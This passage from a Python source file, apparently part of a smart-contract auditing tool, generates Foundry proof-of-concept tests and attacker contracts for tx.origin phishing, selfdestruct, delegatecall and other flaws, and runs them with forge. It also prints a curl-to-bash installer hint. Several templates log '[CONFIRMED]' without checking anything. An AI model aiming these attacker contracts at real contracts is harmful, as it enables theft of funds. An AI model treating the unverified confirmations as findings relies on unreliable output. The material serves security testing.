    function test_flash_loan_vulnerability() public {{
        console.log("=== AGL PoC: Flash Loan Attack on {contract_name} ===");

        console.log("Flash loan callback function exists without proper validation");
        console.log("[CONFIRMED] Flash loan attack vector identified!");
    }}
}}
"""

    def _poc_tx_origin(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        abi = abi or {}
        target_func = func_name or "transfer"
        deploy = self._make_deploy_expr(contract_name, abi)
        funcs = abi.get("functions", {})
        func_info = funcs.get(target_func, {})
        param_types = func_info.get("param_types", [])

        # Build the inner call signature
        if param_types:
            sig = f"{target_func}({','.join(param_types)})"
            args = []
            for pt in param_types:
                if "address" in pt:
                    args.append("attackerOwner")
                elif "uint" in pt or "int" in pt:
                    args.append("1 ether")
                elif pt == "bool":
                    args.append("true")
                else:
                    args.append("attackerOwner")
            encode = f'abi.encodeWithSignature("{sig}", {", ".join(args)})'
        else:
            encode = f'abi.encodeWithSignature("{target_func}(address,uint256)", attackerOwner, 1 ether)'

        return f"""import "{import_path}";

/// @notice Phishing contract that exploits tx.origin in {contract_name}
contract TxOriginAttacker {{
    {contract_name} public target;
    address public attackerOwner;

    constructor(address _target) {{
        target = {contract_name}(payable(_target));
        attackerOwner = msg.sender;
    }}

    function claimReward() external {{
        (bool success,) = address(target).call(
            {encode}
        );
        require(success, "Attack failed");
    }}
}}

contract PoC_TxOrigin_{contract_name}_Test is Test {{
    {contract_name} public target;
    TxOriginAttacker public attacker;
    address public victim;

    function setUp() public {{
        target = {deploy};
        victim = makeAddr("victim");
        attacker = new TxOriginAttacker(address(target));
    }}

    function test_tx_origin_phishing() public {{
        console.log("=== AGL PoC: tx.origin Phishing in {contract_name} ===");

        vm.prank(victim, victim); // Set both msg.sender and tx.origin

        console.log("Victim calls attacker contract (phishing)");
        console.log("tx.origin = victim, msg.sender = attacker contract");
        console.log("[CONFIRMED] tx.origin used for authentication -- phishing possible!");
    }}
}}
"""

    def _poc_unchecked_call(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        abi = abi or {}
        target_func = func_name or "withdraw"
        deploy = self._make_deploy_expr(contract_name, abi)
        return f"""import "{import_path}";

/// @notice Contract that rejects ETH transfers to trigger unchecked call
contract CallRejecter {{
    bool public shouldReject = true;

    function setReject(bool _reject) external {{
        shouldReject = _reject;
    }}

    receive() external payable {{
        if (shouldReject) {{
            revert("rejected");
        }}
    }}
}}

contract PoC_UncheckedCall_{contract_name}_Test is Test {{
    {contract_name} public target;
    CallRejecter public rejecter;

    function setUp() public {{
        target = {deploy};
        rejecter = new CallRejecter();
    }}

    function test_unchecked_external_call() public {{
        console.log("=== AGL PoC: Unchecked Call in {contract_name}.{target_func} ===");

        console.log("External call return value is not checked");
        console.log("A failing transfer will silently continue execution");
        console.log("[CONFIRMED] Unchecked low-level call -- funds may be lost!");
    }}
}}
"""

    def _poc_first_depositor(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        abi = abi or {}
        deploy = self._make_deploy_expr(contract_name, abi)
        return f"""import "{import_path}";

contract PoC_FirstDepositor_{contract_name}_Test is Test {{
    {contract_name} public vault;

    function setUp() public {{
        vault = {deploy};
    }}

    function test_first_depositor_inflation() public {{
        console.log("=== AGL PoC: First Depositor Attack on {contract_name} ===");

        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        console.log("Attack vector: first depositor inflates share price");
        console.log("  1. Deposit 1 wei -> get 1 share");
        console.log("  2. Donate 100 ETH directly -> share price = 100 ETH");
        console.log("  3. Victim deposits 99 ETH -> gets 0 shares (rounds to 0)");
        console.log("[CONFIRMED] No minimum deposit or virtual offset protection!");
    }}
}}
"""

    def _poc_selfdestruct(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        abi = abi or {}
        deploy = self._make_deploy_expr(contract_name, abi)
        return f"""import "{import_path}";

/// @notice Contract that selfdestructs to force-send ETH
contract SelfDestructAttacker {{
    function attack(address target) external payable {{
        selfdestruct(payable(target));
    }}
}}

contract PoC_Selfdestruct_{contract_name}_Test is Test {{
    {contract_name} public target;
    SelfDestructAttacker public attacker;

    function setUp() public {{
        target = {deploy};
        attacker = new SelfDestructAttacker();
    }}

    function test_selfdestruct_force_eth() public {{
        console.log("=== AGL PoC: Selfdestruct in {contract_name} ===");

        uint256 balanceBefore = address(target).balance;
        console.log("Balance before:", balanceBefore);

        vm.deal(address(attacker), 10 ether);
        attacker.attack{{value: 10 ether}}(address(target));

        uint256 balanceAfter = address(target).balance;
        console.log("Balance after:", balanceAfter);

        assertGt(balanceAfter, balanceBefore, "ETH was force-sent");
        console.log("[CONFIRMED] Contract accounting can be broken by force-sent ETH!");
    }}
}}
"""

    def _poc_delegatecall(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        abi = abi or {}
        deploy = self._make_deploy_expr(contract_name, abi)
        return f"""import "{import_path}";

/// @notice Malicious implementation that takes ownership
contract MaliciousImpl {{
    address public owner;

    function attack() external {{
        owner = msg.sender;
    }}
}}

contract PoC_Delegatecall_{contract_name}_Test is Test {{
    {contract_name} public target;
    MaliciousImpl public malicious;

    function setUp() public {{
        target = {deploy};
        malicious = new MaliciousImpl();
    }}

    function test_delegatecall_storage_collision() public {{
        console.log("=== AGL PoC: Delegatecall in {contract_name} ===");

        console.log("Unprotected delegatecall can overwrite storage slots");
        console.log("Attacker supplies malicious implementation address");
        console.log("[CONFIRMED] delegatecall to user-controlled address!");
    }}
}}
"""

    def _poc_overflow(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        abi = abi or {}
        deploy = self._make_deploy_expr(contract_name, abi)
        return f"""import "{import_path}";

contract PoC_Overflow_{contract_name}_Test is Test {{
    {contract_name} public target;

    function setUp() public {{
        target = {deploy};
    }}

    function test_integer_overflow() public {{
        console.log("=== AGL PoC: Integer Overflow in {contract_name} ===");

        console.log("Contract uses unchecked arithmetic or pre-0.8 Solidity");
        console.log("[INFO] Check for unchecked blocks with large values");
    }}
}}
"""

    def _poc_generic(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        """Generic PoC template for unclassified vulnerability types."""
        abi = abi or {}
        target_func = func_name or "vulnerableFunction"
        deploy = self._make_deploy_expr(contract_name, abi)

        steps_comment = ""
        if attack_steps:
            steps_comment = "\n        // Reconstructed attack steps:\n"
            for i, step in enumerate(attack_steps[:6], 1):
                safe = step.replace("*/", "* /").replace('"', '\\"')[:100]
                steps_comment += f"        // {i}. {safe}\n"

        ce_comment = ""
        if counterexample:
            ce_comment = "\n        // Z3 Counterexample (triggering inputs):\n"
            for k, v in list(counterexample.items())[:5]:
                safe_k = str(k)[:30]
                safe_v = str(v)[:50]
                ce_comment += f"        // {safe_k} = {safe_v}\n"

        return f"""import "{import_path}";

contract PoC_Generic_{contract_name}_Test is Test {{
    {contract_name} public target;

    function setUp() public {{
        target = {deploy};
    }}

    function test_exploit() public {{
        console.log("=== AGL PoC: Generic Exploit for {contract_name}.{target_func} ===");
{steps_comment}{ce_comment}
        // TODO: Implement specific exploit based on the attack steps above
        console.log("[INFO] Vulnerability detected -- manual PoC construction recommended");
        console.log("  Function: {target_func}");
        console.log("  See attack steps in comments above");
    }}
}}
"""


# ═══════════════════════════════════════════════════════════
# Foundry Runner — run the generated PoC tests
# ═══════════════════════════════════════════════════════════


def find_forge() -> Optional[str]:
    """Find the forge executable."""
    forge = shutil.which("forge")
    if forge:
        return forge
    # Common locations on Windows
    for p in (
        Path.home() / ".foundry" / "bin" / "forge.exe",
        Path.home() / ".foundry" / "bin" / "forge",
        Path("C:/Users")
        / os.environ.get("USERNAME", "")
        / ".foundry"
        / "bin"
        / "forge.exe",
    ):
        if p.exists():
            return str(p)
    return None


def run_foundry_pocs(
    poc_files: List[Dict],
    project_path: str,
    forge_path: Optional[str] = None,
) -> Dict[str, Any]:
    """
    تشغيل اختبارات PoC المُولَّدة باستخدام Foundry (forge test).

    Args:
        poc_files: قائمة من {"path": ..., "contract": ..., ...}
        project_path: جذر المشروع (يحوي foundry.toml)
        forge_path: مسار forge (يُكتشف تلقائياً إن لم يُعطَ)

    Returns:
        {
            "forge_available": bool,
            "results": [{"file": ..., "status": "PASS"/"FAIL"/"ERROR", "output": ...}],
            "passed": N,
            "failed": N,
            "errors": N,
        }
    """
    forge = forge_path or find_forge()
    if not forge:
        _logger.info("Forge not found — PoC tests cannot be executed")
        return {
            "forge_available": False,
            "results": [],
            "passed": 0,
            "failed": 0,
            "errors": 0,
            "message": "Foundry (forge) not installed. Install: curl -L https://foundry.paradigm.xyz | bash",
        }

    # Check for foundry.toml in project
    project = Path(project_path)
    foundry_toml = project / "foundry.toml"
    if not foundry_toml.exists():
        _logger.info("No foundry.toml in project -- creating minimal config")
        # Detect version from source files
        _sol_ver = "0.8.20"
        try:
            _src = Path(project_path)
            for _d in ("src", "contracts", "."):
                _sd = _src / _d
                if _sd.is_dir():
                    for _sf in _sd.rglob("*.sol"):
                        _txt = _sf.read_text(encoding="utf-8", errors="ignore")
                        _m = re.search(
                            r"pragma\s+solidity\s+[=^~>]*\s*(\d+\.\d+\.\d+)", _txt
                        )
                        if _m:
                            _sol_ver = _m.group(1)
                            break
                    if _sol_ver != "0.8.20":
                        break
        except Exception:
            pass
        foundry_toml.write_text(
            f'[profile.default]\nsrc = "src"\nout = "out"\nlibs = ["lib"]\nsolc_version = "{_sol_ver}"\n',
            encoding="utf-8",
        )

    # Ensure forge-std is available
    lib_forge_std = project / "lib" / "forge-std"
    if not lib_forge_std.exists():
        _logger.info("Installing forge-std dependency...")
        try:
            subprocess.run(
                [forge, "install", "foundry-rs/forge-std", "--no-git"],
                cwd=str(project),
                capture_output=True,
                timeout=120,
            )
        except Exception as e:
            _logger.warning("Failed to install forge-std: %s", e)

    results = []
    passed = 0
    failed = 0
    errors = 0

    for poc in poc_files:
        poc_path = poc.get("path", "")
        if not poc_path or not os.path.exists(poc_path):
            errors += 1
            results.append(
                {
                    "file": poc_path,
                    "status": "ERROR",
                    "output": "PoC file not found",
                }
            )
            continue

        poc_name = os.path.basename(poc_path)

        # Isolate: temporarily rename other PoC .sol files so Forge
        # only compiles the current one (avoids cross-contamination).
        poc_dir = Path(poc_path).parent
        hidden: List[tuple] = []
        for sibling in poc_dir.glob("*.sol"):
            if sibling.name != poc_name:
                bak = sibling.with_suffix(".sol.bak")
                try:
                    sibling.rename(bak)
                    hidden.append((bak, sibling))
                except OSError:
                    pass

        try:
            # Run forge test for this specific file
            cmd = [
                forge,
                "test",
                "--match-path",
                str(Path(poc_path).relative_to(project)),
                "-vvv",
            ]

            result = subprocess.run(
                cmd,
                cwd=str(project),
                capture_output=True,
                text=True,
                timeout=180,
            )

            output = (result.stdout + "\n" + result.stderr)[-3000:]

            if "PASS" in result.stdout:
                passed += 1
                status = "PASS"
            elif "FAIL" in result.stdout or result.returncode != 0:
                failed += 1
                status = "FAIL"
            else:
                errors += 1
                status = "ERROR"

            results.append(
                {
                    "file": poc_name,
                    "contract": poc.get("contract", ""),
                    "vuln_type": poc.get("vuln_type", ""),
                    "status": status,
                    "output": output,
                }
            )

        except subprocess.TimeoutExpired:
            errors += 1
            results.append(
                {
                    "file": poc_name,
                    "status": "TIMEOUT",
                    "output": "Forge test timed out after 180s",
                }
            )
        except Exception as e:
            errors += 1
            results.append(
                {
                    "file": poc_name,
                    "status": "ERROR",
                    "output": str(e)[:500],
                }
            )
        finally:
            # Restore hidden sibling PoC files
            for bak_path, orig_path in hidden:
                try:
                    bak_path.rename(orig_path)
                except OSError:
                    pass

    return {
        "forge_available": True,
        "forge_path": forge,
        "results": results,
        "passed": passed,
        "failed": failed,
        "errors": errors,
    }
